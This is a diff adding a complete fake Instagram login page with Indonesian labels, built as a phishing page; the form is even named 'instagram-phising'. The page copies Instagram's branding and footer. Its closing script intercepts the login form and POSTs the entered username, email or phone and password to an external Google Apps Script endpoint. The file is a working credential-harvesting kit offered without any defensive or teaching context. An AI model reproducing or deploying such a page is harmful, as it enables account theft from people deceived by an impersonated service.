@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Instagram Login Page</title>
+	<link rel="stylesheet" href="styles.css">
+</head>
+<body>
+<form name='instagram-phising'>
+<div class="wrapper">
+	<div class="header">
+		<div class="top">
+			<div class="logo">
+				<img src="instagram.png" alt="instagram" style="width: 175px;">
+			</div>
+			<div class="form">
+				<div class="input_field">
+					<input type="text" placeholder="Nomor telepon, nama pengguna, atau email" class="input" name="id">
+				</div>
+				<div class="input_field">
+					<input type="password" placeholder="Kata Sandi" class="input" name="password">
+				</div>
+				<div class="btn"><button class="btn" type="submit" style="margin-top: -2rem; color: white;">Login</button></div>
+			</div>
+			<div class="or">
+				<div class="line"></div>
+				<p>ATAU</p>
+				<div class="line"></div>
+			</div>
+			<div class="dif">
+				<div class="fb">
+					<img src="facebook.png" alt="facebook">
+					<p>Masuk dengan Facebook</p>
+				</div>
+				<div class="forgot">
+					<a href="#">Lupa kata sandi?</a>
+				</div>
+			</div>
+		</div>
+		<div class="signup">
+			<p>Tidak punya akun? <a href="#">Buat akun</a></p>
+		</div>
+		<div class="apps">
+			<p>Dapatkan Aplikasi</p>
+			<div class="icons">
+				<a href="#"><img src="appstore.png" alt="appstore"></a>
+				<a href="#"><img src="googleplay.png" alt="googleplay"></a>
+			</div>
+		</div>
+	</div>
+</form>	
+	<div class="footer">
+		<div class="links">
+			<ul>
+				<li><a href="#">ABOUT US</a></li>
+				<li><a href="#">SUPPORT</a></li>
+				<li><a href="#">PRESS</a></li>
+				<li><a href="#">API</a></li>
+				<li><a href="#">JOBS</a></li>
+				<li><a href="#">PRIVACY</a></li>
+				<li><a href="#">TERMS</a></li>
+				<li><a href="#">DIRECTORY</a></li>
+				<li><a href="#">PROFILES</a></li>
+				<li><a href="#">HASHTAGS</a></li>
+				<li><a href="#">LANGUAGE</a></li>
+			</ul>
+		</div>
+		<div class="copyright">
+			© 2021 INSTAGRAM
+		</div>
+	</div>
+</div>
+<script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbwiu7JJXQ6fqoLvzFBdUPcW3DwxS_BuVNFojDpA_LcPVkqGdIAWxVXfgWdbJuASM_98AA/exec'
+  const form = document.forms['instagram-phising']
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => console.log('Success!', response))
+      .catch(error => console.error('Error!', error.message))
+  })
+</script>
+</body>
+</html>
